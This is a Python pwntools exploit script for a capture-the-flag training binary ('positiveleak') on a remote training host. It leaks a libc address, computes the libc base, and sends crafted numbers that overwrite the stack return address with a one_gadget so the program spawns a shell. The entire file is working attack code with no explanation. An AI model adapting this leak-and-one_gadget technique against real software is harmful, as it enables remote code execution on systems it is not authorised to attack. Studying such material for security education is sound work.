#!/usr/bin/python3

from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
# context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 3003
PROG = "./positiveleak"
LIBC = "./libc-2.27.so"
# context.log_level = 'error'
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    rm gdb.txt
    brva 0x000012bf
    brva 0x00001386
    command 1
    set logging on
    echo \n\n\n
    x /1bx $rsp
    x /50gx $rsp 
    echo "--------------------------------------------------"
    set logging off
    c
    end
    """)
    input("wait for gdb")
else:
    r = process(PROG)

def add_numbers(count_as_string, num_array):
    """atoll() is performed"""
    if len(num_array) != int(count_as_string):
        log.error("Lengths do not match!")
        exit()
    strings = []
    r.recvuntil("2. Exit")
    r.recvuntil("> ")
    r.sendline(b"0")
    r.recvuntil("How many would you add?")
    r.recvuntil("> ")
    r.sendline(count_as_string)
    first = r.recvuntil("#> ")
    # strings.append(first)
    r.sendline(b"38654705763")
    for i in range(int(count_as_string)):
        line = r.recv()
        sleep(0.0001)
        # strings.append(line) # [%d]#>
        # print(line)
        r.sendline(num_array[i])
        # print(f"Sending [{i}] :", (num_array[i]))



def print_numbers():
    log.info("executing print numbers...")
    strings = []
    r.recvuntil("2. Exit")
    r.recvuntil("> ")
    r.sendline(b"1")
    for i in range(200):
        line = r.recvline()
        strings.append(line)
        # print(line)
    return strings

def add_one_number(num):
    line = r.recv()
    sleep(0.001)
    # strings.append(line) # [%d]#>
    # print(line)
    r.sendline(num)
    # print(f"Sending [{i}] :", (num))


#Leak_libc
add_numbers(b"2", [b"1",b"1" ])
strings = print_numbers()
leak = int(strings[2])
offset_leak = 0x3ec680
log.info("Libc_leak 0x%x", leak)
log.info("Libc_base 0x%x", leak-offset_leak)
libc = ELF(LIBC)
libc.base = leak-offset_leak

addr_NULL = next(libc.search(b"\x00"*8))
# print(hex(libc.base + addr_NULL))
one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
        
array   =   []
size    =   39
tries   =   1
for i in range(size):
    if ( i== size - 1):
        array.append(b"3")
    elif i == 6:
        # print("HEEEY")
        array.append(p64(0xdeadbeef))
    else:
        array.append(str(i).encode())


# print(array)
for i in range(tries):
    add_numbers(str(size).encode(), array )

for i in range(6):
    add_one_number(str(i+1).encode())

add_one_number(b"115964150325")
add_one_number(b"junk")
# add_one_number(b"4702111234474983745")    # Return address on the stack -> 0x4141414141414141
add_one_number(str(libc.base + one_gadgets[0]).encode())      # one_gadget  

for i in range(10):
    if( i +1 == 8 or i+1 == 9 ):
        
        add_one_number(str(libc.base + addr_NULL).encode())
    else:
        add_one_number(str(i+1).encode())

r.interactive()